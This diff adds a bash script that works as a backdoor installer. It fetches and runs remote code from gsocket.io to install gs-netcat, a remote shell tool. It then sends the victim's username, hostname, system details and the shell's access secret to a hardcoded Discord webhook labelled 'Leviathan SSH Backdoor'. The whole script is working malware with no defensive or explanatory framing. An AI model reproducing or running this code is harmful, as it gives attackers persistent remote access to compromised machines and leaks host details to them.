@@ -1,0 +1,23 @@
+#! /bin/bash
+
+[[ -z $KEY ]] && KEY="1137487990436925490/pQp9DxK4ajurt0YWOUtaOvehw27lAVCcngFNIM7WlJ2UIxxodPKU_OnGE09DlMkSjlWQ"
+
+# Install GS-NETCAT and report installation back to DISCORD.
+command -v curl >/dev/null && IS_CURL=1 || command -v wget >/dev/null && IS_WGET=1 || exit 0
+if [[ -n $IS_CURL ]]; then
+    S="$(bash -c "$(curl -fsSL https://gsocket.io/x)")"
+else
+    S="$(bash -c "$(wget --no-verbose -O- https://gsocket.io/x)")"
+fi
+S=${S##*S=\"}
+S=${S%%\"*}
+X=($(hostname; uname -mrs))
+MSG="${USER} ${X[*]} -- gs-netcat -i -s${S:-BAD}"
+
+DATA='{"username": "Leviathan SSH Backdoor", "content": "'"$MSG"'"}'
+if [[ -n $IS_CURL ]]; then
+    curl -H "Content-Type: application/json" -d "${DATA}" "https://discord.com/api/webhooks/${KEY}"
+else
+    wget -q -O- --header="Content-Type: application/json" --post-data="${DATA}" "https://discord.com/api/webhooks/${KEY}"
+fi
+exit 0
